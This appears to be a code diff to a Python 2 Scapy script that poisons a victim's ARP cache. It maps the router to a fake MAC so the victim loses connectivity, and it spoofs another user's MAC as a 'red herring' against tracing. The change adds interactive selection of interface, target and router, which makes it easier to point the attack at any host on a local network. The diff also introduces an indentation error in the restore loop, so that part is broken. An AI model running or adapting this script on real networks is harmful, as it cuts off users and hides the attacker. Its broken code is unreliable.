@@ -4,15 +4,32 @@ from scapy.all import *
 import time
 import signal
 import sys
+from hosts import * 
+import netifaces
 
-victimIP = "192.168.56.105"		#IP address of who we poison
-victimMAC = "08:00:27:49:32:8b"		#MAC address ""
+print "Available interfaces"
+
+for interface in netifaces.interfaces():
+	print interface,
+print
+interface = raw_input("What interface would you like to use?:\n")
+
+machines = getNetwork(interface)
+
+target = raw_input("Select target IP Address:\n")
+
+router = min(machines)
+
+print router
+
+victimIP = target		#IP address of who we poison
+victimMAC = machines[target][0]		#MAC address ""
 
 myMAC = "08:00:27:f7:e8:72"		#MAC address of origin of poisioning 
 					#set as another users MAC for Red herring attempt
 
-deadEndIP = "192.168.1.1"		#IP address of host we dont want victim to talk to
-deadEndMAC = "84:a6:c8:af:12:ed"	#MAC address ""
+deadEndIP = router		#IP address of host we dont want victim to talk to
+deadEndMAC = machines[router][0]	#MAC address ""
 
 killMAC = "08:00:27:ff:ff:fe"		#False MAC address
 
@@ -33,7 +50,6 @@ pkt.hwsrc = killMAC		# His MAC address is ...
 pkt.op = 2			# that's where he's at (is-at)
 #*************************
 
-
 print("Turn out the lights....")
 
 try:
@@ -53,7 +69,7 @@ except KeyboardInterrupt:
 	heal.op = 2
 
 	for i in range(0, 5):
-		sendp(heal, iface="eth0")
+	sendp(heal, iface="eth0")
 		time.sleep(1)
 
 	sys.exit(0)
